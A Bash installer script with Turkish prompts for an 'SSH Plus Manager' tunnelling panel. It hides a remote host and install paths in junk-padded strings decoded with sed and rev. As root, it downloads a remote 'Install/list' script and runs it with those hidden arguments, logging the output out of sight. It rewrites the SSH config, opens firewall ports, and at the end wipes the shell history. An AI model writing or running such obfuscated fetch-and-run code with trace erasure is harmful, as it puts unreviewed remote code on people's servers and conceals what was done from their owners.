#!/bin/bash

_REPO_URL="https://raw.githubusercontent.com/sam53et/temaz-tr/main"
_SCRIPT_DIR=""
if [[ -n "${BASH_SOURCE[0]:-}" ]] && [[ "${BASH_SOURCE[0]}" != *"/dev/fd/"* ]] && [[ -f "${BASH_SOURCE[0]}" ]]; then
	_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || _SCRIPT_DIR=""
fi
if [[ -z "$_SCRIPT_DIR" ]] && [[ -n "${0:-}" ]] && [[ "$0" != *"/dev/fd/"* ]] && [[ "$0" != "bash" ]] && [[ "$0" != "-bash" ]] && [[ -f "$0" ]]; then
	_SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)" || _SCRIPT_DIR=""
fi

set +e

INSTALL_VERSION=""
if [[ -f "$_SCRIPT_DIR/version" ]]; then
	INSTALL_VERSION=$(head -1 "$_SCRIPT_DIR/version" 2>/dev/null | tr -d '\r\n')
fi
if [[ -z "$INSTALL_VERSION" ]]; then
	if command -v curl >/dev/null 2>&1; then
		INSTALL_VERSION=$(curl -sfL --max-time 5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n')
	else
		INSTALL_VERSION=$(wget -qO- --timeout=5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n')
	fi
fi
[[ -z "$INSTALL_VERSION" ]] && INSTALL_VERSION="?"

YES=0
QUIET=0
DEBUG=0
WITH_SERVER_SETTINGS=0
HOSTNAME_OVERRIDE=""
TZ_OVERRIDE=""
NO_UPGRADE=0

while [[ $# -gt 0 ]]; do
	case "$1" in
		--yes|-y) YES=1 ;;
		--quiet|-q) QUIET=1 ;;
		--debug) DEBUG=1 ;;
		--serversettings) WITH_SERVER_SETTINGS=1 ;;
		--hostname)
			HOSTNAME_OVERRIDE="${2:-}"
			shift
			;;
		--timezone)
			TZ_OVERRIDE="${2:-}"
			shift
			;;
		--no-upgrade) NO_UPGRADE=1 ;;
		*) ;;
	esac
	shift
done

if [[ -f "$_SCRIPT_DIR/Modules/colors" ]]; then
	source "$_SCRIPT_DIR/Modules/colors"
elif [[ -f /etc/SSHPlus/colors ]]; then
    source /etc/SSHPlus/colors
elif [[ -f /bin/colors ]]; then
    source /bin/colors
else
    _tmp_colors="/tmp/sshplus_colors_$$"
	if command -v curl >/dev/null 2>&1 && curl -sfL --max-time 10 "$_REPO_URL/Modules/colors" -o "$_tmp_colors" 2>/dev/null; then
		source "$_tmp_colors"
		rm -f "$_tmp_colors" 2>/dev/null
	elif command -v wget >/dev/null 2>&1 && wget -q "$_REPO_URL/Modules/colors" -O "$_tmp_colors" 2>/dev/null; then
        source "$_tmp_colors"
        rm -f "$_tmp_colors" 2>/dev/null
    else
		color_echo()   { printf "\033[1;37m%s\033[0m\n" "$1"; }
		color_echo_n() { printf "\033[1;37m%s\033[0m" "$1"; }
		msg_ok()       { printf "\033[1;32m✔  %s\033[0m\n" "$1"; }
		msg_warn()     { printf "\033[1;33m⚠  %s\033[0m\n" "$1"; }
		msg_err()      { printf "\033[1;31m✖  %s\033[0m\n" "$1"; }
		msg_info()     { printf "\033[1;36m•  %s\033[0m\n" "$1"; }
		get_color_code(){ printf "\033[1;37m"; }
		get_reset_code(){ printf "\033[0m"; }
		banner_info()  { printf "\033[44;1;37m %s \033[0m\n" "$1"; }
	fi
fi

if command -v c >/dev/null 2>&1 && command -v reset >/dev/null 2>&1; then
	_msg_ok()   { printf "%b✔  %s%b\n" "$(c ui_ok)"     "$1" "$(reset)"; }
	_msg_warn() { printf "%b⚠  %s%b\n" "$(c ui_warn)"   "$1" "$(reset)"; }
	_msg_err()  { printf "%b✖  %s%b\n" "$(c ui_danger)" "$1" "$(reset)"; }
	_msg_info() { printf "%b•  %s%b\n" "$(c ui_info)"   "$1" "$(reset)"; }
else
	_msg_ok()   { msg_ok "$1"; }
	_msg_warn() { msg_warn "$1"; }
	_msg_err()  { msg_err "$1"; }
	_msg_info() { msg_info "$1"; }
fi

LOG_DIR="/var/log/sshplus"
LOG_FILE="$LOG_DIR/install.log"
if ! mkdir -p "$LOG_DIR" 2>/dev/null; then
	LOG_DIR="/tmp"
	LOG_FILE="$LOG_DIR/sshplus-install.log"
fi

log() {
	printf "%s %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$*" >>"$LOG_FILE" 2>/dev/null || true
}

debug() {
	[[ "$DEBUG" -eq 1 ]] && _msg_info "$*"
	log "DEBUG: $*"
}

term_cols() { tput cols 2>/dev/null || printf "80"; }
hr() {
	local cols i line
	cols=$(term_cols)
	[[ -z "$cols" || ! "$cols" =~ ^[0-9]+$ ]] && cols=80
	[[ "$cols" -gt 200 ]] && cols=200
	line=""
	i=0
	while [[ "$i" -lt "$cols" ]]; do
		line="${line}─"
		((i++)) || true
	done
	printf "%s\n" "$line"
}

title() {
	local cyan red reset
	cyan=$(get_color_code "cyan" 2>/dev/null || printf "")
	red=$(get_color_code "red" 2>/dev/null || printf "\033[1;31m")
	reset=$(get_reset_code 2>/dev/null || printf "\033[0m")
	printf "%b _____ _____ _____    _____ _            _____%b\n" "$cyan" "$reset"
	printf "%b|   __|   __|  |  |  |  _  | |_ _ ___   |     |___ ___ ___ ___ ___ ___%b\n" "$cyan" "$reset"
	printf "%b|__   |__   |     |  |   __| | | |_ -|  | | | | .'|   | .'| . | -_|  _|%b\n" "$cyan" "$reset"
	printf "%b|_____|_____|__|__|  |__|  |_|___|___|  |_|_|_|__,|_|_|__,|_  |___|_|%b\n" "$cyan" "$reset"
	printf "%b                                                          |___|%bv%s%b\n" "$cyan" "$red" "$INSTALL_VERSION" "$reset"
	hr
}

step_ok()   { _msg_ok "$1";   log "OK: $1"; }
step_warn() { _msg_warn "$1"; log "WARN: $1"; }
step_err()  { _msg_err "$1";  log "ERR: $1"; }
info()      { _msg_info "$1"; log "INFO: $1"; }

require_root() {
	if [[ "$(id -u)" -ne 0 ]]; then
		step_err "Bu kurulum root olarak çalıştırılmalıdır."
    exit 1
	fi
	step_ok "Root olarak çalışıyor"
}

detect_os() {
	if [[ -f /etc/os-release ]]; then
		. /etc/os-release
		OS_NAME="${PRETTY_NAME:-${NAME:-Unknown}}"
		OS_ID="${ID:-unknown}"
	else
		OS_NAME="$(uname -s 2>/dev/null || echo 'Unknown')"
		OS_ID="unknown"
	fi
	if [[ "$OS_ID" == "ubuntu" || "$OS_ID" == "debian" ]]; then
		step_ok "İşletim sistemi destekleniyor: ${OS_NAME}"
	else
		step_warn "İşletim sistemi resmi olarak desteklenmiyor (${OS_NAME}). Yine de devam ediliyor."
	fi
}

check_network() {
	if curl -sfL --max-time 5 "$_REPO_URL/version" >/dev/null 2>&1; then
		step_ok "Ağ bağlantısı normal"
	else
		step_warn "Ağ kontrolü başarısız oldu (github erişilemiyor). Yine de devam edilmeye çalışılacak."
	fi
}

disk_free() {
	local avail
	avail=$(df -h / 2>/dev/null | awk 'NR==2{print $4}')
	[[ -z "$avail" ]] && avail="unknown"
	step_ok "Disk alanı: ${avail} boş"
}

check_existing_install() {
	EXISTING_VERSION=""
	if [[ -f /etc/SSHPlus/version ]]; then
		EXISTING_VERSION=$(head -1 /etc/SSHPlus/version 2>/dev/null | tr -d '\r\n')
	elif [[ -f /bin/version ]]; then
		EXISTING_VERSION=$(head -1 /bin/version 2>/dev/null | tr -d '\r\n')
	fi
	if [[ -n "$EXISTING_VERSION" ]]; then
		step_warn "Mevcut SSH Plus Manager tespit edildi (v${EXISTING_VERSION})."
	else
		step_ok "Mevcut bir kurulum tespit edilmedi"
	fi
}

preflight_required_tools() {
	local required=(curl jq)
	local missing=() ok=1
	for cmd in "${required[@]}"; do
		if ! command -v "$cmd" >/dev/null 2>&1; then
			missing+=("$cmd")
			ok=0
		fi
	done
	if [[ "$ok" -eq 1 ]]; then
		step_ok "Gerekli araçlar: curl jq (tamam)"
	else
		step_warn "Gerekli araçlar: eksik ${missing[*]}"
	fi
}

print_preflight() {
	printf "\nÖn Kontrol\n"
	require_root
	detect_os
	check_network
	disk_free
	check_existing_install
	preflight_required_tools
}

APT_AVAILABLE=0
if command -v apt-get >/dev/null 2>&1; then
	APT_AVAILABLE=1
fi

DEPS_INSTALLER=(curl wget ca-certificates tar)
DEPS_RUNTIME=(
	wget curl screen nano zip lsof net-tools nload jq
	python3 iproute2 cron
)

install_ookla_speedtest() {
	local bin="/usr/local/bin/ookla-speedtest"
	[[ -x "$bin" ]] && return 0
	local arch url tmp
	case "$(uname -m)" in
		x86_64) arch="x86_64" ;;
		aarch64|arm64) arch="aarch64" ;;
		armv7l) arch="armhf" ;;
		*) step_warn "Unsupported architecture for Ookla Speedtest CLI: $(uname -m)"; return 1 ;;
	esac
	tmp=$(mktemp -d)
	url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-${arch}.tgz"
	if ! curl -fsSL "$url" -o "$tmp/speedtest.tgz" 2>>"$LOG_FILE"; then
		step_warn "Failed to download Ookla Speedtest CLI (see $LOG_FILE)."
		rm -rf "$tmp"
		return 1
	fi
	tar -xzf "$tmp/speedtest.tgz" -C "$tmp" speedtest
	install -m 0755 "$tmp/speedtest" "$bin"
	rm -rf "$tmp"
	[[ -x "$bin" ]] && log "Ookla Speedtest CLI installed at $bin"
}
DEPS_SERVER_SETTINGS=(systemd-sysv tzdata)

MISSING_DEPS=()

check_deps() {
	local bin pkgs=("$@")
	for pkgspec in "${pkgs[@]}"; do
		bin="$pkgspec"
		if ! command -v "$bin" >/dev/null 2>&1; then
			MISSING_DEPS+=("$pkgspec")
		fi
	done
	if [[ ${#MISSING_DEPS[@]} -eq 0 ]]; then
		step_ok "Required tools: all present"
	else
		step_warn "Missing tools: ${MISSING_DEPS[*]}"
	fi
}

install_deps() {
	[[ ${#MISSING_DEPS[@]} -eq 0 ]] && return 0
	if [[ "$APT_AVAILABLE" -ne 1 ]]; then
		step_err "apt is not available. Install missing tools manually: ${MISSING_DEPS[*]}"
		exit 1
	fi
	_msg_info "Installing missing dependencies…"
	log "apt-get install -y ${MISSING_DEPS[*]}"
	if ! apt-get update -y >>"$LOG_FILE" 2>&1; then
		step_warn "apt-get update failed (see $LOG_FILE)."
	fi
	apt-get install -y "${MISSING_DEPS[@]}" 2>&1 | tee -a "$LOG_FILE"
	_install_ret=${PIPESTATUS[0]}
	if [[ "$_install_ret" -eq 0 ]]; then
		step_ok "Dependencies installed"
	else
		step_warn "Some packages could not be installed. See output above or $LOG_FILE."
	fi
}

print_plan() {
	printf "\nPlan\n"
	printf "• Kurulum yeri: /bin (scriptler) ve /etc/SSHPlus (yapılandırma/varlıklar)\n"
	printf "• Komut:     /bin/menu (kısayol: h)\n"
	printf "• Kullanıcı Veritabanı:  \$HOME/users.db (varsa yedeklenir)\n"
	printf "• Oturumlar:  \$HOME/sessions.log\n"
	if [[ "$WITH_SERVER_SETTINGS" -eq 1 ]]; then
		printf "• Sunucu ayarları: kurulumdan sonra 'serversettings' çalıştırılacak\n"
	else
		printf "• Sunucu ayarları: isteğe bağlı (menu → SİSTEM → Sunucu ayarları)\n"
	fi
}

ask_yes_no() {
	local prompt="$1" default="${2:-N}" ans
	if [[ "$YES" -eq 1 ]]; then
		[[ "$default" =~ ^[EeYy]$ ]] && return 0 || return 1
	fi
	printf "%s" "$prompt "
	read -r ans || ans=""
	[[ -z "$ans" ]] && ans="$default"
	[[ "$ans" =~ ^[EeYy]$ ]] && return 0 || return 1
}

_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r' | sed -e 's/[^a-z.]//ig' | rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×' | sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×' | sed -e 's/[^a-z/]//ig')

verif_key() {
	chmod +x "$_Ink/list" >/dev/null 2>&1 || true
    if [[ ! -e "$_Ink/list" ]]; then
		step_err "Geçersiz veya eksik kurulum anahtarı (Install/list)."
        exit 1
    fi
}

download_install_list() {
	mkdir -p "$_Ink" >/dev/null 2>&1
	rm -f "$_Ink/list" >/dev/null 2>&1
	if command -v curl >/dev/null 2>&1; then
		if ! curl -sfL --max-time 30 "$_REPO_URL/Install/list" -o "$_Ink/list" 2>/dev/null; then
			step_err "Kurulum paketi indirilemedi (Install/list)."
			step_warn "Ağı kontrol edin veya daha sonra tekrar deneyin."
			exit 1
		fi
	elif command -v wget >/dev/null 2>&1; then
		if ! wget -q -P "$_Ink" "$_REPO_URL/Install/list" 2>/dev/null; then
			step_err "Kurulum paketi indirilemedi (Install/list)."
			step_warn "Ağı kontrol edin veya daha sonra tekrar deneyin."
        exit 1
    fi
	else
		step_err "Ne curl ne de wget bulundu. Bu kurulumu çalıştırmak için birini kurun."
		exit 1
fi
if [[ ! -s "$_Ink/list" ]]; then
		step_err "İndirilen Install/list boş veya geçersiz."
    exit 1
fi
verif_key
	step_ok "Kurulum paketi indirildi"
}

initialize_db() {
	local db home="${HOME:-/root}"
	db="${home}/users.db"
	mkdir -p "$home" 2>/dev/null || true
	if [[ -f "$db" ]]; then
		local ts backup
		ts=$(date '+%Y%m%d-%H%M%S')
		backup="${db}.bak.${ts}"
		cp "$db" "$backup" 2>/dev/null || true
		step_ok "Mevcut users.db şuraya yedeklendi: ${backup}"
	else
		: >"$db"
		chmod 600 "$db" 2>/dev/null || true
		step_ok "${db} konumunda yeni users.db oluşturuldu"
	fi
	local slog="${home}/sessions.log"
	if [[ ! -f "$slog" ]]; then
		: >"$slog"
		chmod 600 "$slog" 2>/dev/null || true
	fi
}

update_version_files() {
	local tmp="/tmp/sshplus_version_$$" val=""
	if command -v curl >/dev/null 2>&1; then
		curl -sfL --max-time 5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n' >"$tmp" || true
		[[ -s "$tmp" ]] && val=$(cat "$tmp")
	fi
	if [[ -z "$val" ]] && command -v wget >/dev/null 2>&1; then
		wget -qO- --timeout=5 "$_REPO_URL/version" 2>/dev/null | head -1 | tr -d '\r\n' >"$tmp" || true
		[[ -s "$tmp" ]] && val=$(cat "$tmp")
	fi
	rm -f "$tmp" 2>/dev/null || true
	if [[ -n "$val" ]]; then
		mkdir -p /etc/SSHPlus 2>/dev/null || true
		printf "%s\n" "$val" >/etc/SSHPlus/version 2>/dev/null || true
		printf "%s\n" "$val" >/bin/version 2>/dev/null || true
		step_ok "Sürüm dosyası v${val} olarak ayarlandı"
	else
		step_warn "Uzak sürüm alınamadı; güncelleme kontrolleri sınırlı olabilir."
	fi
}

setup_launcher() {
	printf "/bin/menu\n" >/bin/h 2>/dev/null || true
	chmod +x /bin/h >/dev/null 2>&1 || true
}

run_install_list() {
	sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config 2>/dev/null || true
	if command -v systemctl >/dev/null 2>&1; then
		systemctl restart ssh >/dev/null 2>&1 || systemctl restart sshd >/dev/null 2>&1 || true
	else
		service ssh restart >/dev/null 2>&1 || true
	fi

	log "Executing Install/list with args: $_lnk $_Ink $_1nk"
	bash "$_Ink/list" "$_lnk" "$_Ink" "$_1nk" "" >>"$LOG_FILE" 2>&1
	step_ok "Temel dosyalar kuruldu (Install/list)"
}

apply_serversettings() {
	if [[ "$WITH_SERVER_SETTINGS" -ne 1 ]]; then
		printf "\n"
		_yellow=$(get_color_code "yellow" 2>/dev/null || printf "\033[1;33m")
		_reset=$(get_reset_code 2>/dev/null || printf "\033[0m")
		printf "%b⚙  Sunucu ayarları şimdi uygulansın mı? [e/H]:%b " "$_yellow" "$_reset"
		read -r _apply_ans || _apply_ans=""
		[[ -z "$_apply_ans" ]] && _apply_ans="H"
		if ! [[ "$_apply_ans" =~ ^[EeYy]$ ]]; then
			return 0
		fi
	fi
	if [[ -x /bin/serversettings ]]; then
		info "Sunucu ayarları modülü başlatılıyor..."
		/bin/serversettings
	else
		step_warn "Sunucu ayarları modülü (/bin/serversettings) bulunamadı."
	fi
}

main() {
	cd "${HOME:-/root}" || cd / || true

	title
	print_preflight

	print_plan
	hr

	printf "\nKuruluyor\n"

	if [[ "$NO_UPGRADE" -eq 0 ]]; then
		if [[ "$YES" -eq 1 ]] || ask_yes_no "Paket indeksi güncellensin mi (apt update)? [E/h]:" "Y"; then
			if [[ "$APT_AVAILABLE" -eq 1 ]]; then
				info "Paket indeksi güncelleniyor..."
				log "apt-get update -y"
				apt-get update -y >/dev/null 2>&1 || step_warn "apt-get update başarısız oldu ($LOG_FILE dosyasına bakın)"
				step_ok "Paket indeksi güncellendi"
				if [[ "$YES" -eq 1 ]] || ask_yes_no "Kurulu paketler yükseltilsin mi (apt upgrade)? [e/H]:" "N"; then
					log "apt-get upgrade -y"
					apt-get upgrade -y >/dev/null 2>&1 || step_warn "apt-get upgrade başarısız oldu ($LOG_FILE dosyasına bakın)"
					step_ok "Kurulu paketler yükseltildi"
				fi
			else
				step_warn "apt mevcut değil; paket indeksi güncellemesi atlanıyor."
			fi
		else
			step_warn "Paket indeksi güncellemesi atlandı (apt update)."
		fi
	else
		step_warn "Paket yükseltmesi atlanıyor (--no-upgrade nedeniyle)."
	fi

	check_deps "${DEPS_INSTALLER[@]}" "${DEPS_RUNTIME[@]}" "${DEPS_SERVER_SETTINGS[@]}"
	install_deps
	install_ookla_speedtest

	download_install_list

	initialize_db

	run_install_list

	update_version_files
	setup_launcher

	if [[ -x /usr/sbin/ufw ]]; then
		/usr/sbin/ufw allow 443/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 80/tcp  >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 3128/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 8799/tcp >/dev/null 2>&1 || true
		/usr/sbin/ufw allow 8080/tcp >/dev/null 2>&1 || true
	fi

	hr
	printf "\nSonuç\n"
	step_ok "Başarıyla kuruldu"

	printf "\nKonumlar\n"
	printf "• Komut:     /bin/menu (kısayol: h)\n"
	printf "• Kullanıcı Veritabanı:  %s/users.db\n" "${HOME:-/root}"
	printf "• Oturumlar:  %s/sessions.log\n" "${HOME:-/root}"
	printf "• Yapılandırma:    /etc/SSHPlus/\n"
	printf "• Kayıt:       %s\n" "$LOG_FILE"

	printf "\nSonraki adımlar\n"
	printf "• Çalıştır: menu\n"
	printf "• Güncelle: menu → [19] Scripti güncelle\n"
	printf "• Kaldır: removescript (menu → SİSTEM → Scripti kaldır)\n"
	printf "• Sunucu ayarları: menu → [13] Sunucu ayarları (veya aşağıdan şimdi uygulayın)\n\n"

	apply_serversettings

	printf "\nÇıkmak için Enter'a basın…"
	read -r _ || true

	rm -f "$HOME/Plus" >/dev/null 2>&1 || true
	: >~/.bash_history 2>/dev/null || true
	history -c 2>/dev/null || true
}

main "$@"